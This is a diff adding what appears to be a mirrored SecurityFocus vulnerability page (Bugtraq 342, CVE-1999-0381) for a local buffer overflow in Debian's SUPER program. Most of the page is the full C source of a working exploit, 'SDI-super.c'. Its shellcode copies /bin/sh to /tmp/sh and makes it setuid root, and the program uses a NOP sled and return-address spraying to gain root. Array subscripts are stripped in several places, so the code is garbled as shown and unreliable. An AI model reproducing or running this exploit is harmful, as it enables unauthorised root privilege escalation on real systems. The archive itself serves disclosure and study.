@@ -1,0 +1,97 @@
+#SpeeDr00t@Black Falcon<br>#bid342<p><b><span style="font-size: 18pt;">Debian Super Syslog Buffer Overflow Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/342/info">info</a><br><a href="http://www.securityfocus.com/bid/342/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/342/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/342/solution">solution</a><br><a href="http://www.securityfocus.com/bid/342/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				342
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Unknown
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-1999-0381<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Feb 25 1999 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jul 11 2009 12:16AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				First posted to BugTraq by c0nd0r &lt;root@sekure.org&gt; on February 25, 1999.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Debian Linux 2.0 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	 --------------- SDI-super.c --------------------------------------<br/><br/> /*<br/><br/> *  Sekure SDI <br/><br/> *  Brazilian Info Security Team <br/><br/> * | ---------------------------------- <br/><br/> * | SUPER exploit for linux |<br/><br/> * | ---------------------------------- |<br/><br/> * | |<br/><br/> * | http://ssc.sekure.org |<br/><br/> * | Sekure SDI Secure Coding Team |<br/><br/> * | |<br/><br/> * | ---------------------------------- |<br/><br/> * | by c0nd0r &amp;lt;condor@sekure.org&amp;gt; |<br/><br/> * | ---------------------------------- |<br/><br/> *  thanks for the ppl at sekure.org: <br/><br/> *  jamez(shellcode), bishop, dumped, <br/><br/> *  bahamas, fcon, vader, yuckfoo. <br/><br/> *<br/><br/> *<br/><br/> * This will exploit a buffer overflow condition in the log section of<br/><br/> * the SUPER program.<br/><br/> *<br/><br/> * It will create a suid bash owned by root at /tmp/sh.<br/><br/> * (It'll defeat the debian bash-2.xx protection against rootshell)<br/><br/> *<br/><br/> * Note: The SUPER program must be compiled with the SYSLOG option.<br/><br/> *<br/><br/> * also thanks people from #uground (irc.brasnet.org network)<br/><br/> *<br/><br/> */<br/><br/> char shellcode =<br/><br/> "\xeb\x31\x5e\x89\x76\x32\x8d\x5e\x08\x89\x5e\x36"<br/><br/> "\x8d\x5e\x0b\x89\x5e\x3a\x31\xc0\x88\x46\x07\x88"<br/><br/> "\x46\x0a\x88\x46\x31\x89\x46\x3e\xb0\x0b\x89\xf3"<br/><br/> "\x8d\x4e\x32\x8d\x56\x3e\xcd\x80\x31\xdb\x89\xd8"<br/><br/> "\x40\xcd\x80\xe8\xca\xff\xff\xff"<br/><br/> "/bin/sh -c cp /bin/sh /tmp/sh; chmod 4755 /tmp/sh";<br/><br/> unsigned long getsp ( void) {<br/><br/> __asm__("mov %esp,%eax");<br/><br/> }<br/><br/> main ( int argc, char *argv ) {<br/><br/> char itamar2040; // ta mar mesmo<br/><br/> long addr;<br/><br/> int x, y, offset = 1000, align=0;<br/><br/> if ( argc &amp;gt; 1) offset = atoi(argv1);<br/><br/> addr = getsp() + offset;<br/><br/> for ( x = 0; x &amp;lt; (1410-strlen(shellcode)); x++)<br/><br/> itamarx = 0x90;<br/><br/> for ( ; y &amp;lt; strlen(shellcode); x++, y++)<br/><br/> itamarx = shellcodey;<br/><br/> for ( ; x &amp;lt; 1500; x+=4) {<br/><br/> itamarx  = (addr &amp;amp; 0xff000000) &amp;gt;&amp;gt; 24;<br/><br/> itamarx+1 = (addr &amp;amp; 0x000000ff);<br/><br/> itamarx+2 = (addr &amp;amp; 0x0000ff00) &amp;gt;&amp;gt; 8;<br/><br/> itamarx+3 = (addr &amp;amp; 0x00ff0000) &amp;gt;&amp;gt; 16;<br/><br/> }<br/><br/> itamarx++ = '\0';<br/><br/> printf ( "\nwargames at 0x%x, offset %d\n", addr, offset);<br/><br/> printf ( "Look for a suid shell root owned at /tmp/sh\n");<br/><br/> execl ( "/usr/local/bin/super", "super", "-T",itamar, (char *) 0);<br/><br/> }
+	
+		<ul>
+</ul>
+</div>
